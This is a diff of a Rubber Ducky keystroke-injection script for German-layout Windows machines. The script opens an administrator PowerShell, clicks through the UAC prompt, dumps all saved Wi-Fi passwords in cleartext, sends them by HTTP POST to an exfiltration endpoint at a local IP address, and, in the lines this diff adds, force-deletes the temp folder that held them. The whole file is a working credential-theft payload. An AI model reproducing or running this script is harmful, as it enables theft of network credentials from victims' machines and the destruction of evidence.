@@ -1,15 +1,12 @@
 DUCKY_LANG DE
-
 DELAY 1000
 REM Open Power User Menu (Win+X)
-
 GUI x
 DELAY 200
 REM Open PowerShell as Administrator
 a
 DELAY 3000
 REM User Account Control umgehen
-
 LEFTARROW
 DELAY 200
 ENTER
@@ -20,11 +17,14 @@ ENTER
 DELAY 500
 REM Extract Wi-Fi passwords and save them to C:\Temp\wifi_passwords.txt
 STRING $profiles = netsh wlan show profiles | Select-String 'r alle Benutzer' | ForEach-Object { $_.Line -replace '.*: ', '' }; foreach ($profile in $profiles) { $password = netsh wlan show profile name=$profile key=clear | Select-String 'inhalt' | ForEach-Object { $_.Line -replace '.*: ', '' }; "`"$profile`" : `"$password`"" >> C:\Temp\wifi_passwords.txt }
-
 ENTER
 DELAY 7000
 REM Exfiltrate the Wi-Fi passwords via HTTP request
 STRING $wifiPasswords = Get-Content C:\Temp\wifi_passwords.txt; Invoke-WebRequest -Uri 'http://192.168.178.20:3000/exfil' -Method POST -Body $wifiPasswords
+ENTER
+DELAY 2000
+REM Delete Temp folder
+STRING Remove-Item -Path 'C:\Temp' -Recurse -Force
 ENTER
 DELAY 2000
 REM Close powershell
